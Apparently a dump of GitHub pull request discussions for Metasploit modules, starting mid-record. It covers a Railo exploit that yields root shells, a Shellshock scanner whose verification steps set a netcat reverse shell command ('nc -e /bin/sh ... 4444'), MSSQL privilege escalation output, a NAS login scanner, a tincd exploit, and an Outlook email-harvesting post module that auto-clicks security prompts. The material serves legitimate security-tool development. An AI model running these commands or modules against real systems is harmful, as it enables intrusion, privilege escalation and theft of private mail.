127.0.0.1\r\nresource (/tmp/railo.rc)> sessions\r\n\r\nActive sessions\r\n===============\r\n\r\nNo active sessions.\r\n\r\n```\r\n\r\n4.2.1 checks vulnerable and is exploited:\r\n\r\n```\r\nresource (/tmp/railo.rc)> set RHOST railo-4-2-1.vuln\r\nRHOST => railo-4-2-1.vuln\r\nresource (/tmp/railo.rc)> check\r\n[*] railo-4-2-1.vuln:8888 - The target appears to be vulnerable.\r\nresource (/tmp/railo.rc)> exploit -j\r\n[*] Exploit running as background job.\r\n```\r\n\r\n4.1.2 checks vulnerable and is exploited:\r\n```\r\nresource (/tmp/railo.rc)> set RHOST railo-4-1-2.vuln\r\nRHOST => railo-4-1-2.vuln\r\nresource (/tmp/railo.rc)> check\r\n[*] Started bind handler\r\n[*] Using URL: http://127.0.0.1:8080/AgSCpChjyWNZvoC.cfm\r\n[*] Using URL: http://127.0.0.1:8080/eyFeaCaetMORSQF\r\n[*] Sending stage. This might be sent multiple times.\r\n[*] railo-4-1-2.vuln:8888 - The target appears to be vulnerable.\r\nresource (/tmp/railo.rc)> exploit -j\r\n[*] Sending stage. This might be sent multiple times.\r\n[*] Sending stage. This might be sent multiple times.\r\n[*] Sending stage. This might be sent multiple times.\r\n[*] Waiting for first stage to download...\r\n[*] Executing stager\r\n[*] Exploit running as background job.\r\n```\r\n\r\n4.0.4 checks invulnerable and is exploited:\r\n\r\n```\r\nresource (/tmp/railo.rc)> set RHOST railo-4-0-4.vuln\r\n[*] Started bind handler\r\nRHOST => railo-4-0-4.vuln\r\nresource (/tmp/railo.rc)> check\r\n[*] Using URL: http://127.0.0.1:8080/gwBieRlDxWSiuBd.cfm\r\n[*] Using URL: http://127.0.0.1:8080/yUiDyqEqhSXfdWS\r\n[*] Sending payload\r\n[*] railo-4-0-4.vuln:8888 - The target is not exploitable.\r\nresource (/tmp/railo.rc)> exploit -j\r\n[*] Sending stage. This might be sent multiple times.\r\n[*] Sending stage. This might be sent multiple times.\r\n[*] Sending stage. This might be sent multiple times.\r\n[*] Sending stage. This might be sent multiple times.\r\n[*] Waiting for first stage to download...\r\n[*] Exploit running as background job.\r\n[*] Executing stager\r\nresource (/tmp/railo.rc)> sleep 5\r\n[*] Started bind handler\r\n[*] Using URL: http://127.0.0.1:8080/LUdUFSbpfJVoIPn.cfm\r\n[*] Using URL: http://127.0.0.1:8080/fecGZTZjZLxNqwl\r\n[-] Exploit failed: Server did not respond with the expected HTTP 500: 404 Not Found\r\n[*] Sending payload\r\n[*] Server stopped.\r\n[*] Command shell session 1 opened (a:52007 -> c:4444) at 2014-09-09 18:49:05 -0700\r\n[*] Command shell session 2 opened (a:42723 -> b:4444) at 2014-09-09 18:49:06 -0700\r\n```\r\n\r\nShow that we have two working sessions:\r\n\r\n```\r\nresource (/tmp/railo.rc)> sessions -c id\r\n[*] Running 'id' on shell session 1 (c)\r\nuid=0(root) gid=0(root) groups=0(root)\r\n\r\n[*] Running 'id' on shell session 2 (b)\r\nuid=0(root) gid=0(root) groups=0(root)\r\n```"", 'Thanks dude!\r\n\r\nSent from a computer\r\n\r\n> On Sep 9, 2014, at 9:13 PM, Jon Hart <notifications@github.com> wrote:\r\n> \r\n> Landed after minor style and usability changes. Looks good! Thanks!\r\n> \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub.']"
536,rapid7/metasploit-framework,3884.0,"And some additional improvements.

## Verification steps:

- [ ] Run the check command on ```auxiliary/scanner/http/apache_mod_cgi_bash_env.rb``` against a vulnerable setup, make sure it flags the host as vulnerable.
- [ ] Run ```auxiliary/scanner/http/apache_mod_cgi_bash_env.rb``` agains a vulnerable setup. Make sure the command executes.","[""> It's kinda like a check method.\r\n\r\nHow about you just make it a check method?"", ""@wchen-r7: I did that at first, but then I wasn't sure it was appropriate for an aux module. It works, though..."", ""It's very appropriate for an aux because it's very explicit. You have my support on that."", ""An example of implementing a check method for this module would look something like this:\r\nhttps://gist.github.com/wchen-r7/c013f1be5786a2258516\r\n\r\nBut you don't have to merge it now if you don't want to. Can come later."", 'Check reimplemented from old code and integrated into new code. Credited @wchen-r7 and @jvazquez-r7 for their help. :)', '@jvazquez-r7 I forgot about ```check_host```. So before you merge, could you please update it? Thx. (See the last two comments)', ""Updated @wvu-r7's PR description w/ verification steps."", 'Fixed!', 'Additional verification steps (from my setup):\r\n\r\n- [ ] use exploit/multi/handler\r\n- [ ] set payload cmd/unix/reverse_netcat_gaping\r\n- [ ] set lhost 172.16.126.1\r\n- [ ] set exitonsession false\r\n- [ ] run -j\r\n- [ ] use auxiliary/scanner/http/apache_mod_cgi_bash_env\r\n- [ ] set rhosts 172.16.126.0/24\r\n- [ ] set targeturi /cgi-bin/hello.pl\r\n- [ ] set cmd /bin/nc -e /bin/sh 172.16.126.1 4444 &\r\n- [ ] set threads 100\r\n- [ ] run\r\n- [ ] sessions -i 1', 'Processing!', ""For this and anything else, please don't block on me or @wvu-r7 today since we're travelling to DerbyCon right now.\n\nThanks @jvazquez-r7 !"", 'This one is working for me, landing!\r\n\r\n```\r\nmsf auxiliary(apache_mod_cgi_bash_env) > rexploit\r\n[*] Reloading module...\r\n\r\n[+] 172.16.158.144:80 - uid=48(apache) gid=48(apache) groups=48(apache) context=root:system_r:httpd_t:s0\r\n[*] Scanned 1 of 1 hosts (100% complete)\r\n[*] Auxiliary module execution completed\r\n```']"
537,rapid7/metasploit-framework,3894.0," This is a module for SQL Server that can be used to escalate privileges to sysadmin if the user has the db_owner role in a ""trustworthy"" database owned by a sysadmin user.  Once the user has the sysadmin role the msssql_payload module can be used to obtain a shell on the system.

Lab setup guide:
https://raw.githubusercontent.com/nullbind/Metasploit-Modules/master/mssql_escalate_dbowner_lab_guide.txt

<pre>
Example of output:
[*] Attempting to connect to the database server at 192.168.1.5 as MyAppUser...
[+] Connected.
[*] Checking if MyAppUser has the sysadmin role...
[*] You're NOT a sysadmin, let's try to change that.
[*] Checking for trusted databases owned by sysadmins...
[+] 1 affected database(s) were found:
[*]  - MyAppDb
[*] Checking if the user has the db_owner role in any of them...
[+] - db_owner on MyAppDb found!
[*] Attempting to escalate in MyAppDb...
[+] Congrats, MyAppUser is now a sysadmin!.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</pre>

","['I think I fixed most of the issues. I also retested the module against my test cases and everything seemed to work.  However, please let me know if I missed anything big.  My coding skills are far from pro level so feedback it welcome. - Thanks', ""Tested successfully:\r\n\r\n```\r\nmsf auxiliary(mssql_escalate_dbowner) > run\r\n\r\n[*] Attempting to connect to the database server at 172.16.158.131:1433 as MyAppUser...\r\n[+] Connected.\r\n[*] Checking if MyAppUser has the sysadmin role...\r\n[-] You're NOT a sysadmin, let's try to change that.\r\n[*] Checking for trusted databases owned by sysadmins...\r\n[+] 1 affected database(s) were found:\r\n[*]  - MyAppDb\r\n[*] Checking if the user has the db_owner role in any of them...\r\n[+] - db_owner on MyAppDb found!\r\n[*] Attempting to escalate in MyAppDb!\r\n[+] Congrats, MyAppUser is now a sysadmin!.\r\n[*] Auxiliary module execution completed\r\nmsf auxiliary(mssql_escalate_dbowner) > run\r\n\r\n[*] Attempting to connect to the database server at 172.16.158.131:1433 as MyAppUser...\r\n[+] Connected.\r\n[*] Checking if MyAppUser has the sysadmin role...\r\n[+] MyAppUser has the sysadmin role, no escalation required.\r\n[*] Auxiliary module execution completed\r\n```\r\n\r\nDoing some code cleanup and landing, thanks @nullbind !"", ""Landed after make some code fixes and clean up by myself, @nullbind feel free to check final version here: https://github.com/rapid7/metasploit-framework/commit/3305b1e9c38c395021e1b536850054706d32625b\r\n\r\nin case there is anything!\r\n\r\nThanks very much for your collab!\r\n\r\nTest after cleaning:\r\n\r\n```\r\nmsf auxiliary(mssql_escalate_dbowner) > run\r\n\r\n[*] Attempting to connect to the database server at 172.16.158.131:1433 as MyAppUser6...\r\n[+] Connected.\r\n[*] Checking if MyAppUser6 has the sysadmin role...\r\n[*] You're NOT a sysadmin, let's try to change that\r\n[*] Checking for trusted databases owned by sysadmins...\r\n[+] 2 affected database(s) were found:\r\n[*]  - MyAppDb\r\n[*]  - MyAppDb2\r\n[*] Checking if the user has the db_owner role in any of them...\r\nLand #3984, @nullbind's MSSQL privilege escalation module\r\n[+] - db_owner on MyAppDb found!\r\n[*] Attempting to escalate in MyAppDb!\r\n[*] MyAppDb\r\n[+] Congrats, MyAppUser6 is now a sysadmin!.\r\n[*] Auxiliary module execution completed\r\n```"", ""Thanks,\r\n\r\nScott\r\n\r\n> On Oct 9, 2014, at 11:40 AM, Juan Vazquez <notifications@github.com> wrote:\r\n> \r\n> Landed after make some code fixes and clean up by myself, @nullbind feel free to check final version here: 3305b1e\r\n> \r\n> in case there is anything!\r\n> \r\n> Thanks very much for your collab!\r\n> \r\n> Test after cleaning:\r\n> \r\n> msf auxiliary(mssql_escalate_dbowner) > run\r\n> \r\n> [*] Attempting to connect to the database server at 172.16.158.131:1433 as MyAppUser6...\r\n> [+] Connected.\r\n> [*] Checking if MyAppUser6 has the sysadmin role...\r\n> [*] You're NOT a sysadmin, let's try to change that\r\n> [*] Checking for trusted databases owned by sysadmins...\r\n> [+] 2 affected database(s) were found:\r\n> [*]  - MyAppDb\r\n> [*]  - MyAppDb2\r\n> [*] Checking if the user has the db_owner role in any of them...\r\n> Land #3984, @nullbind's MSSQL privilege escalation module\r\n> [+] - db_owner on MyAppDb found!\r\n> [*] Attempting to escalate in MyAppDb!\r\n> [*] MyAppDb\r\n> [+] Congrats, MyAppUser6 is now a sysadmin!.\r\n> [*] Auxiliary module execution completed\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub.""]"
538,rapid7/metasploit-framework,4003.0,"This is a LoginScanner auxiliary module for Western
Digital MyBook Live NAS devices as well as the spec
for testing.","[""There's a problem with this branch caused by an accidental rebase.  I'm going to try to fix the issue now, but it may have to wait until tomorrow morning.  Sorry for the inconvenience."", ""I'm having a hell of a time getting this branch straightened out - somehow changes for the tomcat module got twisted into my commits.  Any advice on how to straightened this out would be appreciated - otherwise I can just create a new pull request."", 'Nevermind, looks like I was able to get a handle on the problem and isolate my commits.  Apologies for the insane commit trail.', ""You can rebase and force push. It's evil, but it'll clean up the PR."", 'Would you like me to attempt to rebase and force push even though I have the changes isolated at this point?   ', ""If I were you, I'd go the force-push route.  While the end result for the files will be the same, with the force push you'll have a more clean commit history which is helpful"", '```git rebase -i``` ftw.', ""Sure thing, again, I apologize for getting this all messed up.  I'll work on the commit history tonight and rebase it so that it's more coherent."", ""@wvu-r7 thanks for the tip on `git rebase -i` - that really helped.  I've rebased the commits and force pushed, hopefully things look better now!"", 'I have pushed a new commit that addresses the latest round of comments left by @jhart-r7 .  Thanks again for the feedback.', 'Commits look great, @nstarke! Thanks. :)', ""Odd -- it doesn't appear to be doing anything:\r\n\r\n```\r\nmsf auxiliary(mybook_live_login) > set RHOSTS 10.0.1.18\r\nRHOSTS => 10.0.1.18\r\nmsf auxiliary(mybook_live_login) > run\r\n\r\n[*] Scanned 1 of 1 hosts (100% complete)\r\n[*] Auxiliary module execution completed\r\nmsf auxiliary(mybook_live_login) > set VERBOSE true\r\nVERBOSE => true\r\nmsf auxiliary(mybook_live_login) > run\r\n\r\n[*] Scanned 1 of 1 hosts (100% complete)\r\n[*] Auxiliary module execution completed\r\n```\r\n\r\nThat RHOST does have something listening on 80/TCP.  \r\n\r\nIt looks like one of PASSWORD, PASS_FILE or BLANK_PASSWORDS must be set.  Fixed in https://github.com/nstarke/metasploit-framework/issues/1"", '# Validation\r\n\r\n - [x] Load module, set ```RHOSTS```, confirm that it properly aborts if incorrect ```PASSWORD```, ```PASS_FILE``` or ```BLANK_PASSWORDS``` are set\r\n - [x] Redo above but with valid combinations of those options\r\n - [x] Confirm that requests are sent to the correct URL, with the correct method, using the correct POST data.', 'Landed.  Thanks for the contribution!', 'Thank you, @jhart-r7.']"
539,rapid7/metasploit-framework,2756.0,"A pull request to get some feedback. I'd appreciate if you comment as well on the following:
- additional class in module (if it should be relocated, an example would be helpful, e.g. which mixins etc.)
- puts calls in the additional class
- exploit development and other comments welcome?
- Fedora ROP is on my TODO list (but I wanted to contribute the module before Christmas/holidays)
- Although I left ""average ranking"" in there, the exploit works for all targets with several tested (meterpreter, reverse_tcp, exec) payloads on the first execution run and is therefore very reliable.","['Please run this through ```tools/msftidy.rb``` and make the necessary changes. :)', 'msftidy.rb runs through now', ""This is definitely a cool module. But I was wondering if you've tried the Msf::Exploit::Remote::Tcp mixin for the TincExploitClient class? The TincExploitClient class definitely needs to be implemented as a mixin, probably placed somewhere in the msf/lib/msf/core/exploit directory. And instead of using the Ruby socket, it needs to at least use Rex, otherwise the engine cannot manage the connection. Please take your time and ask questions along the way, may be a little tricky to implement.\r\n\r\n@jlee-r7 Please feel free to add more, or correct me if I'm wrong."", ""I'm trying to relocate the TincExploitClient, but wasn't able to do it so far. I'll try to use the Rex socket afterwards, but as long as it has recv and a send method that should work somehow.\r\n\r\nAt the same time I'm also working on Pidora 18 ARM exploitation target. I already control pc (eip), but have to dive into a little bit more ARM details (+ defeating NX on ARM).\r\n\r\nAs I won't have access to a computer in January, this has to wait until February 2014."", 'so with the last commit the module is done from my point. I open another pull request as soon as the ARM part is done', 'Ready for another round of feedback from @jlee-r7. The code is tested and works (even with different RSA key sizes of client/server, ROP still works too).', 'Hey there, this is a bump, @jlee-r7 can I help with anything to get this module into Metasploit? Also @mubix did you have a look?', 'Submitter indicated they are about to give up and delete the test VMs. No response received on this ping since July. Can someone review the latest code?', 'Tagging someone named @wchen-r7.\n-- \nSent from a tiny computer.\nText (insecure): 512-438-9165', ""@jlee-r7 last reviewed this. If he says it's ok then I don't mind merging."", '@floyd-fuh I submitted a PR to you: https://github.com/floyd-fuh/metasploit-framework/pull/1\r\n\r\nThey\'re the most conservative changes I can make.\r\n\r\nThere\'s really a lot of stuff I\'m not very sure about in the PR, but I don\'t think my ""unsureness"" (is that a word?) is actionable feedback so I don\'t wanna be too picky. Another thing I want to point out is that Msf::Exploit::Remote::TincdExploitClient seems difficult to write rspec for, and there is no rspec... and you see, @todb has this rule that requires people to write rspec:\r\nhttps://github.com/rapid7/metasploit-framework/blob/master/CONTRIBUTING.md#library-code\r\n\r\nBut this new rule was added after this PR was submitted. So I don\'t know if @todb wants to give this a pass.... I\'ll let him decide about this.\r\n\r\nAlso, still would be nice to hear what @jlee-r7 has to say about this.\r\n\r\nOther than that, I don\'t have much to contribute at this point.', ""Providing tests isn't my rule, it's the project's guideline so that we don't continue to pile on new functionality we can't check for regressions when it comes time to tweak and fix.\n\nThis PR includes a protocol definition that no other module uses, though, so I'm not going to make a federal case out of it. After all, it's 11 months old, so it should find some closure with either landing or rejecting.\n\nJust eyeballing, it looks like specs wouldn't be hard to include - the sock sends are seperated out - but there are lots of other protocols I'd prefer we spend time with before this special purpose one.\n\nJust be mindful of landing stuff that's untestable in a CI way."", ""All, thanks for the feedback. I'll work on this in the next few weeks (worst case Christmas) and let you know when the next version is ready for review."", 'Ok, I think this is it. Can we merge please @wchen-r7 ? Or do we still need someone to comment, @todb @jlee-r7 @hmoore-r7 ?', ""Looks like there's merge conflicts."", 'Ok, had to do the entire rebase dance because I added a single line to lib/msf/core/exploit/mixins.rb.\r\n\r\nGithub and Travis CI is happy now. Can we merge it now?', 'awesome stuff @floyd-fuh, some fixes are required (some are optional) before we can land this, but thanks very much for your submission!', ""@kernelsmith what do you think? I'm ready if you are."", 'By now this feels like doing responsible disclosure :(', ""Hey, @floyd-fuh. I'm really sorry about the lack of movement on this. We spoke a bit on IRC about @kernelsmith taking over, but he's probably busy now... I think this is good to go. :)"", 'Merge conflicts were fixed, the rest are just style gripes but not show stoppers.', ""As commented on https://github.com/rapid7/metasploit-framework/pull/2756#issuecomment-61480986, should have specs for new protocol libraries, but since it's used exactly once I'm not making a federal case out of it. worst that happens is that future changes either break all of framework or break just this module. The first case is easy to spot.\r\n"", 'w00t, thanks!', '\n[![Coverage Status](https://coveralls.io/builds/6397525/badge)](https://coveralls.io/builds/6397525)\n\nChanges Unknown when pulling **9243cfdbb7fb3f57922727751810c6ad895a6494 on floyd-fuh:master** into ** on rapid7:master**.\n']"
540,rapid7/metasploit-framework,4220.0,"This module allows to read and search e-mails present in Outlook installations. It is using powershell in order to search the e-mails.

When connecting to Outlook using powershell, a security popup appears. WinAPI is used to automatically click on the popup, so access is allowed.

This module is tested on Windows 8.1 x64 with Outlook 2013.","[""@wez3 Are you using hard tabs for your module? It looks like you are. Please make sure you're using spaces instead of hard tabs. You can run the retab.rb tool in msf/tools/dev which will automatically adjust for you."", 'Also, please make sure you run msftidy on your module. It will do some automatic inspection.', 'Thanks for your feedback. I will apply it soon', 'New version committed, all feedback applied', 'I have currently no way to test this module, but i tried the powershell scripts localy.\r\n\r\nThe following script throws an exception, if the folder does not exist:\r\n```\r\nfunction Get-Emails {\r\nparam ([String]$searchTerm,[String]$Folder,[String]$searchObject)\r\nAdd-Type -Assembly ""Microsoft.Office.Interop.Outlook""\r\n$Outlook = New-Object -ComObject Outlook.Application\r\n$Namespace = $Outlook.GetNameSpace(""MAPI"")\r\n$NameSpace.Folders.Item(1)\r\n$Email = $NameSpace.Folders.Item(1).Folders.Item($Folder).Items\r\n$Email | Where-Object {$_.$searchObject -like \'*\' + $searchTerm + \'*\'}\r\nWrite-Host $Email\r\n}\r\nGet-Emails ""test"" ""Inbox"" ""HTMLBody""\r\n```\r\n\r\nOutput (currently on a german windows):\r\n```\r\nAusnahme beim Aufrufen von ""Item"" mit 1 Argument(en):  ""Der versuchte Vorgang konnte nicht ausgef\xc3\xbchrt werden. Ein Objekt wurde nicht gefunden.""\r\nIn Zeile:7 Zeichen:1\r\n+ $Email = $NameSpace.Folders.Item(1).Folders.Item($Folder).Items\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\r\n    + FullyQualifiedErrorId : ComMethodTargetInvocation\r\n```\r\nit says: Object not found\r\n\r\nIs it possible to add a check first if the folder exists?', 'Build in a check to see whether the folder exists. Also replaced cmd_exec, because it was not working correctly on Windows 7. Now tested on:\r\nWindows 8.1 x64 outlook 2013 (en-US)\r\nWindows 7 x64 outlook 2010 (NL)', ""I've already restarted Travis and it's still failing. The error has something to do with msfcli and it actually doesn't make any sense to me, considering the PR is still adding a new module, not making new changes to existing code."", 'So here are my first test results:\r\n:white_check_mark: Non existing language\r\n```\r\nmsf post(outlook) > run\r\n[-] System language not supported, only English (en-US) and Dutch (NL) are supported, you can specify the targets system translations in the options A_TRANSLATION (Allow) and ACF_TRANSLATION (Allow access for)\r\n[-] Post failed: SystemExit exit\r\n[-] Call stack:\r\n[-]   /root/hacking/metasploit-framework/modules/post/windows/gather/outlook.rb:136:in `abort\'\r\n[-]   /root/hacking/metasploit-framework/modules/post/windows/gather/outlook.rb:136:in `run\'\r\n[*] Post module execution completed\r\n```\r\n:white_check_mark: Setting german values\r\n```\r\nmsf post(outlook) > set ACF_TRANSLATiON ""Zugriff gew\xc3\xa4hren f\xc3\xbcr""\r\nmsf post(outlook) > set A_TRANSLATION ""Erteilen""\r\nmsf post(outlook) > show options\r\n\r\nModule options (post/windows/gather/outlook):\r\n\r\n   Name             Current Setting         Required  Description\r\n   ----             ---------------         --------  -----------\r\n   ACF_TRANSLATION  Zugriff gew\xc3\xa4hren f\xc3\xbcr  no         Fill in the translation of the phrase ""Allow access for"" in the targets system language, to click on the security popup.\r\n   A_TRANSLATION    Erteilen                no         Fill in the translation of the word ""Allow"" in the targets system language, to click on the security popup.\r\n   FOLDER                                   no         The e-mailfolder to read (e.g. Inbox)\r\n   KEYWORD                                  no         Search e-mails by the keyword specified here\r\n   LIST_FOLDERS     true                    yes        List the available folders\r\n   SESSION          1                       yes       The session to run this module on.\r\n\r\nmsf post(outlook) > run\r\n\r\n[+] Powershell is installed on this system.\r\n[+] Available folders in the mailbox: \r\n#< CLIXML\r\n\r\nFolderPath                                                                                                             \r\n----------                                                                                                             \r\n\\\\test@test.com\\Gel?schte Objekte                                                                     \r\n\\\\test@test.com\\Posteingang                                                                           \r\n\\\\test@test.com\\Postausgang                                                                           \r\n\\\\test@test.com\\Gesendete Objekte                                                                     \r\n\\\\test@test.com\\Aufgaben                                                                              \r\n\\\\test@test.com\\Einstellungen f?r QuickSteps                                                          \r\n\\\\test@test.com\\Einstellungen f?r Unterhaltungsaktionen                                               \r\n\\\\test@test.com\\Entw?rfe                                                                              \r\n\\\\test@test.com\\Journal                                                                               \r\n\\\\test@test.com\\Junk-E-Mail                                                                           \r\n\\\\test@test.com\\Kalender                                                                              \r\n\\\\test@test.com\\Kontakte                                                                              \r\n\\\\test@test.com\\Newsfeed                                                                              \r\n\\\\test@test.com\\Notizen                                                                               \r\n\\\\test@test.com\\RSS-Feeds                                                                             \r\n\\\\test@test.com\\Synchronisierungsprobleme                                                             \r\n\\\\test@test.com\\Vorgeschlagene Kontakte                                                               \r\n\r\n\r\n<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Module werden f?r erstmalige Verwendung vorbereitet.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>[*] System has currently been idle for 201 seconds\r\n[*] Post module execution completed\r\n```\r\n\r\n:white_check_mark: Test non existent folder\r\n```\r\nmsf post(outlook) > set folder inbox\r\nfolder => inbox\r\nmsf post(outlook) > set keyword test\r\nkeyword => test\r\nmsf post(outlook) > run\r\n\r\n[+] Powershell is installed on this system.\r\n[+] Available folders in the mailbox: \r\n..............\r\n[*] System has currently been idle for 268 seconds\r\n\r\nApplication            : Microsoft.Office.Interop.Outlook.ApplicationClass\r\nClass                  : 2\r\nSession                : Microsoft.Office.Interop.Outlook.NameSpaceClass\r\nParent                 : Microsoft.Office.Interop.Outlook.NameSpaceClass\r\nDefaultItemType        : 0\r\nDefaultMessageClass    : IPM.Note\r\nDescription            : \r\nEntryID                : xxxxxxxxxxxxx\r\nFolders                : System.__ComObject\r\nItems                  : System.__ComObject\r\nName                   : test@test.com\r\nStoreID                : yyyyyyyyyyyyyy\r\n                         zzzzzzzzzzzzzz\r\n                         xxxxxxxxxxxxxx\r\nUnReadItemCount        : 0\r\nUserPermissions        : \r\nWebViewOn              : True\r\nWebViewURL             : res://C:\\Program Files (x86)\\Microsoft Office\\Office14\\1031\\OUTLWVW.DLL/outlook.htm\r\nWebViewAllowNavigation : True\r\nAddressBookName        : \r\nShowAsOutlookAB        : False\r\nFolderPath             : \\\\test@test.com\r\nInAppFolderSyncObject  : False\r\nCurrentView            : System.__ComObject\r\nCustomViewsOnly        : False\r\nViews                  : System.__ComObject\r\nMAPIOBJECT             : System.__ComObject\r\nFullFolderPath         : \\\\test@test.com\r\nIsSharePointFolder     : False\r\nShowItemCount          : 1\r\nStore                  : System.__ComObject\r\nPropertyAccessor       : System.__ComObject\r\nUserDefinedProperties  : System.__ComObject\r\n\r\nThe folder does not exist in the Outlook installation. Please fill in a correct foldername.\r\n\r\n[*] Post module execution completed\r\nmsf post(outlook) > \r\n```\r\n\r\n:x: Only error I encountered: When searching for mail and a result should be shown, I\'m only getting this output:\r\n```\r\nSystem.__ComObject System.__ComObject System.__ComObject\r\n```\r\n\r\nI assume the module should print the system when there is a result instead of the type?', 'The module is also missing subfolders created under a folder like inbox on list_folders. Is this an expected bahaviour?', 'Is the keyword ""test"" present in the HTMLBody of the email? The module is currently only searching in the email content.\r\n\r\nI did not add a functionality to view subfolders, this is expected', 'will try it tomorrow with other testcases.\r\n\r\n@wchen-r7 are there any written guidelines about output on postmodules and if they need to be stored or smth? Or is the user free to decide on the output?', '> @wchen-r7 are there any written guidelines about output on post modules and if they need to be stored or smth? Or is the user free to decide on the output?\r\n\r\nThere are no written guidelines about how the output should look (I don\'t think). But I do know what we like: no unicode, English only, and would be nice to begin your message with ""ip:port"". And generally speaking, users prefer informative messages. Like for example, when you print an error, it\'s best to avoid saying ""an unknown error has occurred"", instead you should say ""connection timed out"" or something more specific. \r\n\r\nAs for storing, that\'s up to the author to decide. It basically comes down to common sense on whether you should store or not, and personal preference (you feel like the data should be stored, or no). The only ""guidelines"" we have about storing can be found here:\r\nhttps://github.com/rapid7/metasploit-framework/wiki/How-to-do-reporting-or-store-data-in-module-development', 'FireFart, were you able to test with other testcases?', 'Hi, sorry i had no access to a windows machine with outlook so far. I hope I can test it this week', 'Applied your feedback FireFart, thanks.', 'There is a dependency on [`iconv` when the module is loading](https://travis-ci.org/rapid7/metasploit-framework/jobs/42734991):\r\n\r\n![screen shot 2014-12-02 at 7 58 33 am](https://cloud.githubusercontent.com/assets/298259/5263638/1f5bf43c-79f9-11e4-980d-d4ca2d64eddf.png)\r\n\r\niconv does not exist in Ruby 2.0+.  You must remove the dependency on iconv and use the built-in support for String encoding in Ruby 2.0+ instead.', '@wez3 there is a post powershell mixin:\r\nhttps://dev.metasploit.com/api/Msf/Post/Windows/Powershell.html#execute_script-instance_method\r\n\r\nHere is an example of how to use it:\r\nhttps://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/manage/powershell/exec_powershell.rb\r\n\r\nI think this would eliminate the use of `iconv` if you use the `compress_script` method and pass the output to `execute_script`.\r\n\r\nYou can also add new methods to the post mixin itself or change existing ones, but then it would require some rspecs.', ""Thanks both. I will apply it later on. It's better to use these functions i guess"", '@wchen-r7 msftidy complains about a unicode character in the german translation:\r\n```\r\nmodules/post/windows/gather/outlook.rb:14 - [ERROR] Unicode detected: "" ACF_HASH = { \\""en_US\\"" => \\""Allow access for\\"", \\""NL\\"" => \\""Toegang geven voor\\"", \\""de_DE\\"" => \\""Zugriff gew\\xC3\\xA4hren f\\xC3\\xBCr\\"", \\""de_AT\\"" => \\""Zugriff gew\\xC3\\xA4hren f\\xC3\\xBCr\\"" }\\n""\r\n```\r\nis this a no go or is there a other way to define this hash?', '@FireFart,\r\n\r\nOne way to get around that is you write the whole value in hex. So something like:\r\n\r\n```ruby\r\n# I don\'t speak German, but I speak Chinese. And this means ""How are you""\r\n""chinese"" => ""\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd\\xe5\\x97\\x8e""\r\n```\r\n\r\nIf this is no go, one option is actually ignore msftidy. I think you can still land your PR that way, but please make sure to explain in the commit why you have to do it.', '@wez3 here is the hash without umlauts. Can you please replace the umlauts with the hex encoding?\r\n```\r\nACF_HASH = { \r\n    ""en_US"" => ""Allow access for"",\r\n    ""NL"" => ""Toegang geven voor"",\r\n    ""de_DE"" => ""Zugriff gew\\xc3\\xa4hren f\\xc3\\xbcr"",\r\n    ""de_AT"" => ""Zugriff gew\\xc3\\xa4hren f\\xc3\\xbcr""\r\n}\r\n\r\nACF_HASH.each {|key, value|\r\n    puts key \r\n    puts value\r\n}\r\n\r\nputs ACF_HASH\r\n```\r\n\r\nthx @wchen-r7 ', 'Done, also replaced iconv', ""I also encountered the following error:\r\n```\r\nmsf post(outlook) > run\r\n\r\n[+] Powershell is installed on this system.\r\n[-] Post failed: NoMethodError undefined method `name' for nil:NilClass\r\n[-] Call stack:\r\n[-]   /root/hacking/metasploit-framework/modules/post/windows/gather/outlook.rb:188:in `run'\r\n[*] Post module execution completed\r\n```"", 'ok strange behaviour:\r\nthe action is case sensitive.\r\nIf you set it to lowercase, no action will be set and the action.name is Nil. This looks more like a framework bug', 'I would also be tempted for the scripts to live in `data/exploits/powershell` along with the powerdump.ps1 script. They would be easier for users to modify on the fly if they needed tweaking etc. And a bit cleaner. \r\n', 'I added a bug report for the action.name crash so just ignore the exception in the meantime', 'new version committed, thanks', '@wez3 I created a PR here https://github.com/wez3/metasploit-framework/pull/2 with some final formatting and I applied @Meatballs1 suggestion to move the script to the data folder. Would be great if @Meatballs1 can also have a final look and give some feedback.\r\n\r\nThanks so far for your contribution and your patience with the review process! :)', ""I've merged and tested your modifications in my environment, it works fine. Thanks for your feedback all the time, quite new to MSF contribution :)"", ""@wchen-r7 any final thoughts on this one? I think it's good to merge""]"
541,rapid7/metasploit-framework,4456.0,"... plus the kerberos support needed on Rex and module mixin. The kerberos support isn't complete, but it's good enough to exploit ms14-068. So hopefully it's good enough for PR.

Verification

- [x] Be sure travis is green
- [x] Run specs locally, they should pass

```
$ rspec spec/lib/msf/kerberos/
Msf::Kerberos::Client::Base ............
Msf::Kerberos::Client::AsResponse ........
Msf::Kerberos::Client::AsRequest ..........
Msf::Kerberos::Client::TgsResponse ...
Msf::Kerberos::Client::CacheCredential ....................
Msf::Kerberos::Client::TgsRequest .........................
Msf::Kerberos::Client::Pac ...............

Finished in 0.25268 seconds
93 examples, 0 failures

Randomized with seed 51708

$ rspec spec/lib/rex/proto/kerberos/
Rex::Proto::Kerberos::Model::EncryptedData ........
Rex::Proto::Kerberos::Model::PrincipalName ........
Rex::Proto::Kerberos::Pac::LogonInfo .
Rex::Proto::Kerberos::Model::EncKdcResponse ............
Rex::Proto::Kerberos::CredentialCache::Credential .
Rex::Proto::Kerberos::Pac::Type .
Rex::Proto::Kerberos::Pac::ServerChecksum .
Rex::Proto::Kerberos::Pac::ClientInfo .
Rex::Proto::Kerberos::Model::KdcRequestBody ........................
Rex::Proto::Kerberos::CredentialCache::Principal .
Rex::Proto::Kerberos::Model::ApReq .
Rex::Proto::Kerberos::Client .....
Rex::Proto::Kerberos::Model::AuthorizationData ..
Rex::Proto::Kerberos::CredentialCache::Time .
